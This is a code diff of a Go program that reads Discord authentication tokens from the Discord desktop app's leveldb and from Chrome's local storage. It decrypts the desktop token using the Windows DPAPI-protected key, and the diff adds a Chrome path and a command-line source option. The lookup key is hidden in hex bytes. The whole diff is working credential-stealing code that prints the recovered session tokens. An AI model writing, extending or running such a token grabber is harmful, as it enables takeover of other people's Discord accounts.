@@ -1,35 +1,39 @@
 package main
 
 import (
-	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"os"
 	"path/filepath"
-	"strings"
 	"syscall"
-	"time"
 	"unsafe"
+
+	"github.com/alexflint/go-arg"
+	"github.com/syndtr/goleveldb/leveldb"
 )
 
-var toFind = []byte{
-	'\x64', '\x51', '\x77', '\x34', '\x77', '\x39', '\x57', '\x67',
-	'\x58', '\x63', '\x51', '\x3A',
+var tokenKey = []byte{
+	'\x5F', '\x68', '\x74', '\x74', '\x70', '\x73', '\x3A', '\x2F', '\x2F',
+	'\x64', '\x69', '\x73', '\x63', '\x6F', '\x72', '\x64', '\x2E', '\x63',
+	'\x6F', '\x6D', '\x00', '\x01', '\x74', '\x6F', '\x6B', '\x65', '\x6E',
 }
 
 var (
-	dllcrypt32      = syscall.NewLazyDLL("Crypt32.dll")
-	dllkernel32     = syscall.NewLazyDLL("Kernel32.dll")
-	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
-	procLocalFree   = dllkernel32.NewProc("LocalFree")
-	discordPath     = filepath.Join(os.Getenv("appdata"), "discord")
-	localStatePath  = filepath.Join(discordPath, "Local State")
-	levelDbPath     = filepath.Join(discordPath, "Local Storage", "leveldb")
+	dllcrypt32        = syscall.NewLazyDLL("Crypt32.dll")
+	dllkernel32       = syscall.NewLazyDLL("Kernel32.dll")
+	procDecryptData   = dllcrypt32.NewProc("CryptUnprotectData")
+	procLocalFree     = dllkernel32.NewProc("LocalFree")
+	discordPath       = filepath.Join(os.Getenv("appdata"), "discord")
+	localStatePath    = filepath.Join(discordPath, "Local State")
+	levelDbPath       = filepath.Join(discordPath, "Local Storage", "leveldb")
+	chromeLevelDbPath = filepath.Join(
+		os.Getenv("localappdata"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
 )
 
 func handleErr(errText string, err error) {
@@ -37,7 +41,16 @@ func handleErr(errText string, err error) {
 	panic(errString)
 }
 
-func populatePaths(path string) ([]string, error) {
+func parseArgs() (*Args, error) {
+	var args Args
+	arg.MustParse(&args)
+	if !(args.Source >= 1 && args.Source <= 3) {
+		return nil, errors.New("Source must be between 1 and 3.")
+	}
+	return &args, nil
+}
+
+func populateDirs(path string) ([]string, error) {
 	var paths []string
 	files, err := ioutil.ReadDir(path)
 	if err != nil {
@@ -45,7 +58,7 @@ func populatePaths(path string) ([]string, error) {
 	}
 	for _, f := range files {
 		fname := f.Name()
-		if !f.IsDir() && strings.HasSuffix(fname, ".ldb") {
+		if !f.IsDir() && fname != "LOCK" {
 			filePath := filepath.Join(path, fname)
 			paths = append(paths, filePath)
 		}
@@ -53,53 +66,57 @@ func populatePaths(path string) ([]string, error) {
 	return paths, nil
 }
 
-func getLastMod(paths []string) (string, error) {
-	var (
-		lastMod     time.Time
-		lastModPath string
-	)
-	for i, path := range paths {
-		stat, err := os.Stat(path)
-		if err != nil {
-			return "", err
-		}
-		modTime := stat.ModTime()
-		if i == 0 {
-			lastMod = modTime
-			lastModPath = path
-			continue
-		}
-		if modTime.After(lastMod) {
-			lastMod = modTime
-			lastModPath = path
-		}
-	}
-	return lastModPath, nil
-}
-
-func getOffset(path string) (int, []byte, error) {
-	data, err := ioutil.ReadFile(path)
+func backupLdbFolder(path, tempPath string) error {
+	paths, err := populateDirs(path)
 	if err != nil {
-		return -1, nil, err
+		return err
 	}
-	offset := bytes.Index(data, toFind)
-	if offset == -1 {
-		return -1, nil, errors.New("No hits.")
+	for _, path := range paths {
+		srcFile, err := os.OpenFile(path, os.O_RDONLY, 0755)
+		if err != nil {
+			return err
+		}
+		destPath := filepath.Join(tempPath, filepath.Base(path))
+		destFile, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY, 0755)
+		if err != nil {
+			srcFile.Close()
+			return err
+		}
+		_, err = io.Copy(destFile, srcFile)
+		srcFile.Close()
+		destFile.Close()
+		if err != nil {
+			return err
+		}
 	}
-	return offset + 12, data, nil
+	return nil
 }
 
-func getEncToken(offset int, data []byte) ([]byte, error) {
-	var _encToken string
-	for {
-		char := string(data[offset])
-		if char == "\"" {
-			break
-		}
-		_encToken += char
-		offset++
+func getToken(path string) (string, error) {
+	db, err := leveldb.OpenFile(path, nil)
+	if err != nil {
+		return "", err
 	}
-	return base64.StdEncoding.DecodeString(_encToken)
+	defer db.Close()
+	token, err := db.Get(tokenKey, nil)
+	if err != nil {
+		return "", err
+	}
+	return string(token[2 : len(token)-1]), nil
+}
+
+func getEncToken(path string) ([]byte, error) {
+	db, err := leveldb.OpenFile(path, nil)
+	if err != nil {
+		return nil, err
+	}
+	defer db.Close()
+	_encToken, err := db.Get(tokenKey, nil)
+	if err != nil {
+		return nil, err
+	}
+	encToken := _encToken[14 : len(_encToken)-1]
+	return base64.StdEncoding.DecodeString(string(encToken))
 }
 
 func makeBlob(d []byte) *DataBlob {
@@ -130,7 +147,7 @@ func decryptKey(data []byte) ([]byte, error) {
 	return outBlob.toByteArray(), nil
 }
 
-func getKey(localStatePath string) ([]byte, error) {
+func getKey() ([]byte, error) {
 	var localState LocalState
 	stateBytes, err := ioutil.ReadFile(localStatePath)
 	if err != nil {
@@ -152,8 +169,8 @@ func getKey(localStatePath string) ([]byte, error) {
 }
 
 func decryptToken(encToken, key []byte) (string, error) {
-	nonce := encToken[3 : 3+12]
-	encTokenWithTag := encToken[3+12:]
+	nonce := encToken[3:15]
+	encTokenWithTag := encToken[15:]
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", nil
@@ -169,38 +186,77 @@ func decryptToken(encToken, key []byte) (string, error) {
 	return string(decToken), nil
 }
 
-func main() {
-	paths, err := populatePaths(levelDbPath)
+func desktop(tempPath string) (string, error) {
+	err := backupLdbFolder(levelDbPath, tempPath)
 	if err != nil {
-		handleErr("Failed to populate LDB paths.", err)
+		fmt.Println("Failed to backup ldb folder.")
+		return "", err
 	}
-	var path string
-	pathsLen := len(paths)
-	if pathsLen == 0 {
-		panic("Couldn't find any LDB files.")
-	} else if pathsLen > 1 {
-		path, err = getLastMod(paths)
-		if err != nil {
-			handleErr("Failed to get last modified LDB file.", err)
-		}
-	} else {
-		path = paths[0]
-	}
-	offset, data, err := getOffset(path)
+	encToken, err := getEncToken(tempPath)
 	if err != nil {
-		handleErr("Failed to get encrypted token offset.", err)
+		fmt.Println("Failed to get encrypted token.")
+		return "", err
 	}
-	encToken, err := getEncToken(offset, data)
+	key, err := getKey()
 	if err != nil {
-		handleErr("Failed to get encrypted token.", err)
-	}
-	key, err := getKey(localStatePath)
-	if err != nil {
-		handleErr("Failed to get local state key.", err)
+		fmt.Println("Failed to get local state key.")
+		return "", err
 	}
 	decToken, err := decryptToken(encToken, key)
 	if err != nil {
-		handleErr("Failed to decrypt token.", err)
+		fmt.Println("Failed to decrypt token.")
+		return "", err
 	}
-	fmt.Println(decToken)
+	return decToken, nil
+}
+
+func chrome(tempPath string) (string, error) {
+	err := backupLdbFolder(chromeLevelDbPath, tempPath)
+	if err != nil {
+		fmt.Println("Failed to backup ldb folder.")
+		return "", err
+	}
+	token, err := getToken(tempPath)
+	if err != nil {
+		fmt.Println("Failed to get token.")
+		return "", err
+	}
+	return token, nil
+}
+
+func main() {
+	args, err := parseArgs()
+	if err != nil {
+		handleErr("Failed to parse args.", err)
+	}
+	tempPath, err := os.MkdirTemp(os.TempDir(), "")
+	if err != nil {
+		handleErr("Failed to make temp directory.", err)
+	}
+	defer os.RemoveAll(tempPath)
+	switch args.Source {
+	case 1:
+		token, err := desktop(tempPath)
+		if err != nil {
+			handleErr("Failed to dump desktop token.", err)
+		}
+		fmt.Println(token)
+	case 2:
+		token, err := chrome(tempPath)
+		if err != nil {
+			handleErr("Failed to dump Chrome token.", err)
+		}
+		fmt.Println(token)
+	case 3:
+		token, err := desktop(tempPath)
+		if err != nil {
+			handleErr("Failed to dump desktop token.", err)
+		}
+		fmt.Println(token)
+		token, err = chrome(tempPath)
+		if err != nil {
+			handleErr("Failed to dump Chrome token.", err)
+		}
+		fmt.Println(token)
+	}
 }
